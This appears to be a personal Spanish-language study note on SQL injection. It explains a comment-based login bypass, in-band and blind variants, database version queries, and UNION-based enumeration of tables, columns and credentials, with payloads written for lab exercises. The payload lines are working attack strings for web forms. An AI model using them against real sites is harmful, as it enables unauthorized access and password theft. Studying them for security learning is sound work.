## 2025-02-05
# ¿Que es una injeccion SQL?
Tipo de vulnerabilidad en la que el hacker interfiere en la conversacion entre la aplicacion web y su base de datos.
La idea general es que la pagina web utiliza algun tipo de formulario o cookie que nosotros podemos modificar,
que se chequea en una base de datos SQL, el problema ocurre generalmente cuando el input del usuario no es 
sanitizado correctamente y termina ejecutando codigo que no deberia. Ejemplo:

> Supongamos que tenemos una pagina web con un formulario que nos pide usuario (juan) y contraseña (12345),
  en ese caso el query que la aplicacion hace a la base de datos se veria algo asi:

```
SELECT * FROM USERS WHERE USERNAME = 'juan' AND PASSWORD = '12345';
```

> Ahora ponele que nosotros decidimos poner en el nombre de usuario caracteres especiales de SQL, como por Ejemplo
  ' o --, en este caso si nuestro input no es sanitizado se podria generar problemas.
  
```
SELECT * FROM USERS WHERE USERNAME = 'admin'--' AND PASSWORD = '';
```

> como interpreta esto SQL? En este caso el ' que agregamos esta cerrando comillas mientras que el -- esta comentando
  el resto del codigo, por ende el query quedaria asi:


```
SELECT * FROM USERS WHERE USERNAME = 'admin'
```

> Y listo, pasamos como usuario admin sin pedir contraseña.


# Tipos de SQL injection 
## In-Band / Classic
Cuando el hacker manda el payload y recibe los resultados en el mismo canal de comunicacion. Es el tipo de ataque mas simple
y el que siempre queremos ver ya que es el mas facil de testear y el q da resultados mas rapido. Un ejemplo de esto es el ultimo q vimos.
Existen 2 tipos de In-Band:
    
    1. Error Based: Utiliza los mensajes de error que nos manda el server para determinar la estructura de la base de datos. 
    2. SQLI Union: Usa el operador UNION de SQL para conectar uno o mas comandos SELECT




## [Blind / Inferential](blind_sqli)
**No se ven directamente las respuestas al payload** ya que la informacion no se transmite por el mismo canal (la pagina web), por ende
hay que analizar el comportamiento de la aplicacion. El payload aca es un poco diferente ya que si o si tenes q hacer **preguntas
por si o por no** a la base de datos y asi recolectar la informacion.
Este tipo de ataques ocurren cuando la aplicacion esta configurada para q muestre mensajes de error generico como unica solucion a SQLI

    1. Boolean: 
    2. Time based: 

# Reconocimiento 
## Tipo de DB y VERSION
Determinar la version de la db es clave para entender a que ataques es vulnerable. Para esto usamos querys especificas
que dependen del tipo de db:
| database type    | Query            |
| ---------------- | ---------------- |
| Microsoft, MySQL | SELECT @@version |
| Oracle           | SELECT BANNER FROM v$version|
| PostgreSQL       | SELECT version() |

## Listar el contenido de la DB 
Casi todas las db (menos oracle) tienen tablas llamadas INFORMATION_SCHEMA para acceder a metadata de la DB.
La sintaxis del query se veria masomenos asi `SELECT * FROM information_schema.tables` esto devuelve todas las tablas de la DB.
Ejemplos de payload que arme yo:

> caso 1: era en un laboratorio que mostraba diferentes productos y te dejaba elegir entre categorias, el payload iba en la categoria.
¿Que hace?, te da el nombre de todas las tablas en la db, tiene una segunda columna ya porque el primer select tiene 2 columnas.

`1' UNION SELECT table_name, NULL from information_schema.tables--` 

> Despues le seguia esto que sacaba todas las columnas en una tabla importante:

`1'UNION SELECT column_name, NULL from information_schema.columns WHERE table_name = 'users_teyztz'--` 

> Por ultimo, usamos esto para sacar toda la data en la columna q sacamos antes de la tabla q seleccionamos:

`1' UNION SELECT username_fwlwud, password_dqfpbc from users_teyztz--`

### Listar el contenido en Oracle
En Oracle para conseguir todas las tablas de la DB haces `SELECT * FROM all_tables` y para mostrar todas las columnas `SELECT * FROM all_tab_columns`.
Mismo ejemplo de payload que en el anterior:

> Mostrar nombre de todas las tablas de la db, con una segunda columna x regla del UNION.

`1' UNION SELECT table_name, NULL from all_tables--`

> Mostrar nombre de todas las columnas de una tabla.

`1'UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_EAOXGK'--`

> Usamos la informacion q conseguimos para sacar data de las columnas.

`1'UNION SELECT USERNAME_ZQULEF, PASSWORD_QWMRCY FROM USERS_EAOXGK--` 

## Reglas del operador UNION
    - Misma cantidad de columnas en cada select
    - Las columnas tienen q ser del mismo tipo
Para determinar cuantas columnas tenemos podemos usar `' order by n` donde n es el numero de columnas q queremos testear, la idea
es hacerlo varias veces hasta q de un error y eso significa que la tabla tiene n - 1 de columnas.
Para determinar si son del mismo tipo hacemos `UNION SELECT type` donde type es int o string ('a'). Acordarse de cumplir la regla anterior cuando testeamos type. 




     
    

    
